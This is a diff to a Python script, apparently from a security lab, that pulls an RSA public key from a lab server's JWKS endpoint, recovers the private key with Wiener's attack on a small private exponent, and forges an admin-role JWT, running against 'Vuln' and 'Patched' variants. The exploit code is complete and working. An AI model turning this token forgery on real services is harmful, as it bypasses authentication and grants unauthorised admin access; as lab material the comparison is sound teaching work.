@@ -14,6 +14,47 @@ import os
 BASE_URL = "http://http_server_c:8000"
 HTTP_TIMEOUT = 10
 
+def b64url_decode(s: str) -> bytes:
+    rem = len(s) % 4
+    if rem:
+        s += "=" * (4 - rem)
+    return base64.urlsafe_b64decode(s.encode("ascii"))
+
+def jwk_to_rsa_pubkey(jwk: dict) -> RSA.RsaKey:
+    """
+    Convert a single RSA JWK (n,e) -> PyCryptodome RSA public key
+    """
+    n = int.from_bytes(b64url_decode(jwk["n"]), "big")
+    e = int.from_bytes(b64url_decode(jwk["e"]), "big")
+    return RSA.construct((n, e))
+
+def fetch_jwks(base_url: str) -> dict:
+    url = base_url.rstrip("/") + "/.well-known/jwks.json"
+    r = requests.get(url, timeout=HTTP_TIMEOUT)
+    r.raise_for_status()
+    return r.json()
+
+def pick_jwk(jwks: dict, kid: str | None = None) -> dict:
+    keys = jwks.get("keys", [])
+    if not keys:
+        raise ValueError("JWKS has no keys")
+    if kid is None:
+        # lab case: single key
+        return keys[0]
+    for k in keys:
+        if k.get("kid") == kid:
+            return k
+    raise ValueError(f"kid not found in JWKS: {kid}")
+
+def fetch_public_key_from_jwks(base_url: str, kid: str | None = None) -> RSA.RsaKey:
+    jwks = fetch_jwks(base_url)
+    jwk = pick_jwk(jwks, kid=kid)
+    return jwk_to_rsa_pubkey(jwk)
+
+def rsa_pubkey_to_pem(pub: RSA.RsaKey) -> bytes:
+    return pub.export_key(format="PEM")
+
+
 def integer_nth_root(n: int, k: int) -> int:
     if n < 0:
         raise ValueError("n must be non-negative")
@@ -94,38 +135,14 @@ def recover_p_q_from_phi(n: int, phi: int):
     if p * q == n:
         return int(p), int(q)
     return None, None
-
-def main():
-    log_dir = os.getenv("LOG_DIR", "logs")
-    os.makedirs(log_dir, exist_ok=True)
-    log_path = os.path.join(log_dir, f"attackC_{time.strftime('%Y%m%d_%H%M%S')}.log")
-
-    logger = logging.getLogger()
-    logger.setLevel(logging.INFO)
-
-    fmt = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-
-    ch = logging.StreamHandler(sys.stdout)
-    ch.setFormatter(fmt)
-    logger.addHandler(ch)
-
-    fh = logging.FileHandler(log_path, mode="w", encoding="utf-8")
-    fh.setFormatter(fmt)
-    logger.addHandler(fh)
-
-    logging.info(f"Logging to file: {log_path}")
-    pub_url = BASE_URL.rstrip("/") + "/public.pem"
-    logging.info(f"[*] Fetching public key from: {pub_url}")
+def attack(TypeLab: str):
+    logging.info(f" Lab {TypeLab} - Wiener's Attack on RSA with small d")
+    pub = fetch_public_key_from_jwks(BASE_URL, kid=f"lab-{TypeLab.lower()}")  
+    pub_pem = rsa_pubkey_to_pem(pub)
+    logging.info(f"publickey: {pub_pem.decode()}")
     start = time.time()
     try:
-        resp = requests.get(pub_url, timeout=HTTP_TIMEOUT, verify=False)
-        resp.raise_for_status()
-    except Exception as e:
-        logging.info(f"[!] Error fetching public key: {e}")
-        return
-
-    try:
-        rsa_pub = RSA.import_key(resp.content)
+        rsa_pub = RSA.import_key(pub_pem)
     except Exception as e:
         logging.info(f"[!] Failed to parse public key PEM: {e}")
         return
@@ -135,7 +152,7 @@ def main():
     logging.info("[*] Running Wiener's attack ...")
     d_found, k_found = wiener_attack(e, n)
     if d_found is None:
-        logging.info("[!] Wiener attack failed.")
+        logging.info("No weak d found.")
         return
     logging.info(f"[+] Wiener success: d={d_found}")
 
@@ -145,7 +162,7 @@ def main():
     rsa_priv = RSA_mod.construct((n, e, d_found, p, q)) if p else RSA_mod.construct((n, e, d_found))
 
     payload = {"sub": "attacker", "role": "admin", "iat": int(time.time()), "exp": int(time.time()) + 3600}
-    header = {"alg": "RS256", "typ": "JWT"}
+    header = {"alg": "RS256", "typ": "JWT", "kid": f"lab-{TypeLab.lower()}"}
     header_b = json.dumps(header, separators=(',', ':'), sort_keys=True).encode()
     payload_b = json.dumps(payload, separators=(',', ':'), sort_keys=True).encode()
     signing_input = b"%s.%s" % (b64url_encode(header_b).encode(), b64url_encode(payload_b).encode())
@@ -177,6 +194,30 @@ def main():
 
     total = time.time() - start
     logging.info(f"[*] Complete. Total elapsed: {total:.3f}s")
+def main():
+    log_dir = os.getenv("LOG_DIR", "logs")
+    os.makedirs(log_dir, exist_ok=True)
+    log_path = os.path.join(log_dir, f"attackC_{time.strftime('%Y%m%d_%H%M%S')}.log")
+
+    logger = logging.getLogger()
+    logger.setLevel(logging.INFO)
+
+    fmt = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+
+    ch = logging.StreamHandler(sys.stdout)
+    ch.setFormatter(fmt)
+    logger.addHandler(ch)
+
+    fh = logging.FileHandler(log_path, mode="w", encoding="utf-8")
+    fh.setFormatter(fmt)
+    logger.addHandler(fh)
+
+    logging.info(f"Logging to file: {log_path}")
+    logging.info("======================================================================================================================")
+    attack("Vuln")
+    logging.info("======================================================================================================================")
+    attack("Patched")
+
 
 if __name__ == "__main__":
     main()
